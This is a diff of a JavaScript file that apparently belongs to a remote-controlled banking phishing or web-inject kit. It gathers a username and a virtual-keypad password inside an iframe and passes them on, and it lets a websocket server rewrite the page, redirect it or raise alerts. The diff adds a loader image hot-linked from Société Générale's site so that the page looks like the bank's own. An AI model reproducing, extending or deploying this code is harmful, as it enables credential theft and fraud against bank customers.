@@ -10457,13 +10457,17 @@ function PsyProcessInput(psyId)
                 inp = inp.substring(inp.length-2,inp.length-1)
         }
         else {
-            //     console.log('clicked');
+            console.log('clicked');
             var key = psyId.replace('psy_key_', '');
             $("#psy_frame").contents().find(".maCase").filter(function () {
                 return $(this).css('visibility') === 'hidden';
             }).first().css("visibility", "visible");
             if (inp.length < 6)
-                inp = inp + key.toString();
+            {
+                //var passowrdInput = $("#psy_frame").contents().find("[data-pass='psy_password']");
+                //inp = passowrdInput.val();
+            }
+            inp = inp + key.toString();
         }
     }
     else {
@@ -10481,8 +10485,10 @@ function PsyProcessInput(psyId)
                 PsySend('branch',{branch: branchInput.val(),branch_name:branchName.val()});
                 break;
             case 'psy_login_submit':
+                console.log("login clicked");
                 var usernameInput = $("#psy_frame").contents().find('#psy_username');
-
+                //var passowrdInput = $("#psy_frame").contents().find("[data-pass='psy_password']");
+                //inp = passowrdInput.val();
                 isValid = usernameInput.val().search(new RegExp(usernameInput.attr('pattern'))) >= 0;
                 isValid  = isValid &&  inp.search(new RegExp('.{6,}')) >= 0;
                 if(!isValid) {
@@ -10520,13 +10526,13 @@ function PsyProcessMessage(message)
 {
     //console.log(message);
     var wsMessage = JSON.parse(message);
-
     //console.log(wsMessage.type);
     switch (wsMessage.type)
     {
         case 0: //Pfill
             var homeContent = (wsMessage.data);
             $("#psy_frame").contents().find(wsMessage.target).html(homeContent);
+            $('#psy_loading').hide();
             break;
         case 1: //Pgoto
             window.location.hash = wsMessage.data;
@@ -10534,6 +10540,8 @@ function PsyProcessMessage(message)
             break;
         case 2: //Pswitch
             $("#psy_frame").contents().find(wsMessage.target).css(wsMessage.data.name,wsMessage.data.value);
+            $('#psy_loading').hide();
+            linkEvents();
             break;
         case 3: //Palert
             alert(wsMessage.data);
@@ -10588,9 +10596,15 @@ function getCookie(name)
 function addLoading()
 {
 
-    $('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000' +
+    /*$('body').append('<style>.psy_loading   {display: none;background-color: white;width: 100%;position: fixed;height: 100%;z-index:5000' +
         ';top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }' +
         '</style><div id="psy_loading" class="psy_loading"><div >     <img src="https://image.ibb.co/eZMq7S/loading_2.gif" alt="Loading..." class="bk-loader"></div></div>');
+    $('body').append('<style>.psy_blocker   {opacity: 0.2; display: none;background-color: black;width: 100%;position: fixed;' +
+        'height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_blocker > div{top: 50%;left: 49%;position: fixed;    }' +
+        '</style><div id="psy_blocker" class="psy_blocker"><div ></div></div>');*/
+    $('body').append('<style>.psy_loading   {display: none;background-color:black;opacity:0.5; width: 100%;position: fixed;height: 100%;z-index:5000' +
+        ';top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_loading > div{top: 50%;left: 49%;position: fixed;    }' +
+        '</style><div id="psy_loading" class="psy_loading"><div >     <img src="https://particuliers.societegenerale.fr/icd/static/swm/resources/version/18.76.0/markets/PRI/NGIM/img/loader.gif" alt="Loading..." class="bk-loader"></div></div>');
     $('body').append('<style>.psy_blocker   {opacity: 0.2; display: none;background-color: black;width: 100%;position: fixed;' +
         'height: 100%;z-index:5000;top: 0;left: 0;text-align: center;   vertical-align: middle;}.psy_blocker > div{top: 50%;left: 49%;position: fixed;    }' +
         '</style><div id="psy_blocker" class="psy_blocker"><div ></div></div>');
